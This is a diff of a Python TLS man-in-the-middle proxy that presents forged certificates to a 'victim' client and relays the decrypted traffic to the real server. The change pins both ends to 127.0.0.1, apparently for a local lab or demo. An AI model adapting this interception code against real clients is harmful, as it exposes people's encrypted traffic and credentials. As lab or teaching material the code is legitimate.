@@ -18,6 +18,8 @@ from certs import ensure_mitm_certs
 
 STOP = threading.Event()
 
+HOST = "127.0.0.1"
+
 def relay(src, dst, name):
     """Relay decrypted data between sockets while optionally logging it.
 
@@ -60,12 +62,11 @@ def relay(src, dst, name):
         try: dst.close()
         except: pass
 
-def handle_client(client_tls, real_host):
+def handle_client(client_tls):
     """Accept a victim TLS session and bridge it to the real server.
 
     Args:
       client_tls: TLS-wrapped socket from the victim client.
-      real_host: Hostname or IP address of the real TLS server.
 
     Returns:
       None.
@@ -82,8 +83,8 @@ def handle_client(client_tls, real_host):
     """
 
     try:
-        #print(f"[MITM] Connecting to real server {real_host}:{config.PORT_SERVER_REAL}")
-        real_sock = socket.create_connection((real_host, config.PORT_SERVER_REAL))
+        #print(f"[MITM] Connecting to real server {HOST}:{config.PORT_SERVER_REAL}")
+        real_sock = socket.create_connection((HOST, config.PORT_SERVER_REAL))
 
         # TLS context for connecting to real server
         server_ctx = ssl.create_default_context()
@@ -101,7 +102,7 @@ def handle_client(client_tls, real_host):
         # Second TLS handshake (proxy -> real server).  If this fails the MITM
         # cannot observe plaintext but the client still believes it connected to
         # the intended host because of the forged certificate.
-        real_tls = server_ctx.wrap_socket(real_sock, server_hostname=real_host)
+        real_tls = server_ctx.wrap_socket(real_sock, server_hostname="localhost")
         # print("[MITM] TLS handshake with real server successful")
 
         # Start bidirectional relay (decrypted streams)
@@ -134,12 +135,7 @@ def main():
     """
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("--port", type=int, default=config.PORT_SERVER_MITM,
-                        help="Port for the proxy to listen on")
-    parser.add_argument("--listen-host", default="0.0.0.0",
-                        help="Interface/IP for the proxy listener (default: 0.0.0.0)")
-    parser.add_argument("--server-host", default=config.HOST,
-                        help="Real server host/IP to connect to (default: config.HOST)")
+    parser.add_argument("--port", type=int, default=config.PORT_SERVER_MITM)
     args = parser.parse_args()
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -153,8 +149,8 @@ def main():
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #print(f"[MITM] Binding on {args.listen_host}:{args.port}")
-        s.bind((args.listen_host, args.port))
+        #print(f"[MITM] Binding on {HOST}:{args.port}")
+        s.bind((HOST, args.port))
         s.listen(5)
         #print(f"[MITM] Listening on {args.port}, forwarding to {config.PORT_SERVER_REAL}")
 
@@ -167,7 +163,7 @@ def main():
                 # validation or trusts the rogue certificate.
                 client_tls = context.wrap_socket(client_sock, server_side=True)
                 #print("[MITM] TLS handshake with client successful")
-                threading.Thread(target=handle_client, args=(client_tls, args.server_host), daemon=True).start()
+                threading.Thread(target=handle_client, args=(client_tls,), daemon=True).start()
             except Exception as e:
                 #print("[MITM] Handshake with client failed:", e)
                 client_sock.close()
